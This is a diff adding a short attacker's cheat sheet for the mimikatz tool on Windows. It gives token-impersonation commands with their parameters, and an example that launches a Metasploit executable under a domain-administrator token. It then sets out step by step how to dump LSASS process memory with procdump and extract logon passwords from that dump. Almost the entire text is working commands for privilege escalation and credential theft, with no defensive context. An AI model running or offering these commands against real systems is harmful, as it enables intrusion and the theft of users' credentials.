@@ -1,0 +1,46 @@
+Impersonation of Logged on Users:
+
+token::list <- list all tokens in system
+
+token::elevate <- typically used by mimikatz to get from administrator to system, sets the impersonation token
+
+token::revert <- clears the imperonsation token
+
+token::run <- instead of setting the imperonsation token, start a new process with that token
+
+
+the list, elevate and run share a common implementation so the parameters are the same:
+
+
+/id:tokenid (numeric id)
+/user:name (does not accept a domain, elevate and run will pick first on it finds)
+
+/domainadmin
+/enterpriseadmin
+/admin
+/system (default)
+
+/process (used by token::run to specify the process to run, i dont think it takes arguments)
+
+
+e.g.
+
+token::run /domainadmin /process:c:\windows\temp\msf.exe
+
+
+
+
+
+Minidump:
+
+For older windows, and older procdump is needed:
+* https://web.archive.org/web/20080530012252/http://live.sysinternals.com/procdump.exe
+
+Create the dump:
+
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+Then load into mimikatz:
+
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
